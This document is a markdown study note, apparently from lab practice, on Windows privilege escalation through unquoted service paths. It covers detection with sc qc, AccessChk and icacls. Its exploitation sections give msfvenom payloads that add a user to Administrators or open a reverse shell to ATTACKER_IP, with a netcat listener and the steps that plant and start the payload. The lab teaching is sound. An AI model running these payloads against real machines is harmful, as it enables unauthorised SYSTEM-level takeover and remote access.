## Vulnerability

A Windows service executable path containing spaces should normally be enclosed in quotes:

```text
"C:\Program Files\RealVNC\VNC Server\vncserver.exe"
```

If the path is **unquoted**:
```text
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

Windows may interpret the path in multiple ways and check for executables at earlier locations.

If a low-privileged user can write to one of those earlier locations, they may place a malicious executable there and have it executed when the service starts.

### Attack condition

An exploitable unquoted service path generally requires:
```text
Unquoted service path
        +
Spaces in the path
        +
Writable earlier directory
        +
Service starts with higher privileges
```

---

## 1. Detect Unquoted Service Path

Query the service:
```cmd
sc qc unquotedsvc
```

Look for:
```text
BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedsvc.exe
SERVICE_START_NAME : LocalSystem
```

Important fields:
- `BINARY_PATH_NAME` → executable launched by the service.
- `SERVICE_START_NAME` → account running the service.
- `LocalSystem` → highly privileged Windows service account.

If `BINARY_PATH_NAME` contains spaces and is **not surrounded by quotes**, investigate it.

### Example

Vulnerable:
```text
C:\Program Files\Unquoted Path Service\Common Files\unquotedsvc.exe
```

Normally:
```text
"C:\Program Files\Unquoted Path Service\Common Files\unquotedsvc.exe"
```

---

## 2. How Windows Resolves an Unquoted Path

Given:
```text
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

Windows can potentially look for executables at earlier points such as:
```text
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

The exact resolution behavior depends on the path and Windows executable search rules, but the important point is:

> **An attacker may be able to place an executable at an earlier candidate path.**

For example:
```text
C:\MyPrograms\Disk.exe
```

If the service starts and Windows resolves to `Disk.exe`, our executable runs instead of the intended service executable.

---

# 3. Check Directory Permissions

Use AccessChk:
```cmd
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\MyPrograms\"
```

`AccessChk.exe` is **Microsoft Sysinternals**, not built into Windows.

Look for permissions such as:
```text
BUILTIN\Users
  FILE_ADD_FILE
  FILE_ADD_SUBDIRECTORY
```

or:
```text
BUILTIN\Users:(AD)
BUILTIN\Users:(WD)
```

Common meanings:
- `AD` → Add subdirectory
- `WD` → Write data / create files
- `W` → Write
- `M` → Modify
- `F` → Full control

If ordinary users can create files in the required directory, the path may be exploitable.

### Built-in alternative

You can also inspect permissions with:
```cmd
icacls C:\MyPrograms
```

---

# 4. Exploitation — Add User to Administrators

Create a service-compatible executable:
```bash
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

Transfer `common.exe` to the Windows VM.

Place the payload in the vulnerable service directory:
```cmd
copy C:\PrivEsc\common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

For the `unquotedsvc` lab, the important point is that `Common.exe` is positioned at an executable candidate created by the unquoted path.

Start the service:
```cmd
sc start unquotedsvc
```
or:
```cmd
net start unquotedsvc
```

Check group membership:
```cmd
net localgroup administrators
```

If successful, `user` should appear in the local Administrators group.

---

# 5. Exploitation — Reverse Shell

Instead of adding a user to Administrators, we can use a reverse-shell executable.

Create the payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=ATTACKER_IP \
LPORT=4446 \
-f exe-service \
-o rev-svc2.exe
```

Transfer it to Windows.

Place it at the vulnerable candidate path:
```cmd
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```

The important part is:
```text
C:\MyPrograms\Disk.exe
```

This is an earlier executable candidate for:
```text
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

Start the listener on Kali:
```bash
nc -lvnp 4446
```

Then start the service:
```cmd
net start "disk sorter enterprise"
```

If the service resolves the path to `Disk.exe`, the payload executes using the service's account.

Verify:
```cmd
whoami
```

Example:
```text
wprivesc1\svcusr2
```

If the service runs as `LocalSystem`, the result should instead be:
```text
nt authority\system
```

---

# 6. Restarting the Service

In a lab, you may be able to restart the service yourself:

```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

However, **in a real-world scenario you may not have permission to stop/start the service**.

You may instead need to wait for:
- an administrator to restart it
- the service to restart automatically
- the machine to reboot
- a scheduled maintenance/restart event

This is important because:

> **Exploiting the path does not automatically execute the payload. The service must actually start and resolve the malicious executable.**

---

# 7. Important Difference From Normal Service Binary Hijacking

### Normal writable service executable

You directly replace:
```text
C:\Program Files\App\service.exe
```

because the executable itself is writable.
```text
Writable service.exe
        ↓
Replace service.exe
        ↓
Start service
        ↓
Payload
```

### Unquoted service path

You **don't necessarily modify the original executable**.

Instead, you exploit how Windows interprets the unquoted path:
```text
Unquoted path
        ↓
Spaces
        ↓
Earlier executable candidate
        ↓
Writable directory
        ↓
Place malicious executable
        ↓
Start service
        ↓
Payload
```

This is why **unquoted service paths should have their own file: `07_Unquoted_Service_Paths.md`**, separate from `03_Service_Exploitation.md`.

---

#  Attack Chain

### `unquotedsvc`

```text
unquotedsvc
    ↓
Runs as SYSTEM
    ↓
BINARY_PATH_NAME is unquoted
    ↓
Path contains spaces
    ↓
Windows checks earlier executable candidates
    ↓
Candidate directory is writable by Users
    ↓
Create malicious Common.exe
    ↓
Start/restart service
    ↓
Common.exe executes as SYSTEM
    ↓
SYSTEM privileges
```

## Key Idea

> **Unquoted service path + spaces + writable candidate directory + privileged service account = potential service path hijacking.**

The most important thing to remember is **not simply “unquoted path = vulnerable.”** You need to verify the **candidate executable location is writable** and that the **service actually runs with useful privileges**.